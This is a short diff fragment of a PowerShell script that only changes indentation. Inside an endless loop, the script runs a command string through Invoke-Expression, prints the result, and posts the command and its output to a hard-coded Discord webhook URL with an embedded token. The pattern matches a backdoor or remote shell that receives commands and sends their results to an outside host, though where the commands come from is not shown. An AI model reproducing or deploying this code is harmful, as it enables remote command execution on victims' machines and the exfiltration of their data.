@@ -28,11 +28,11 @@ while ($true) {
         # Run the command
         $result = Invoke-Expression -Command $command
 
-		#Print the output to console
-		Write-Host $result
+	#Print the output to console
+	Write-Host $result
 
-		#Post to Discord
-		$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
+	#Post to Discord
+	$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
         $payload = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" 
 
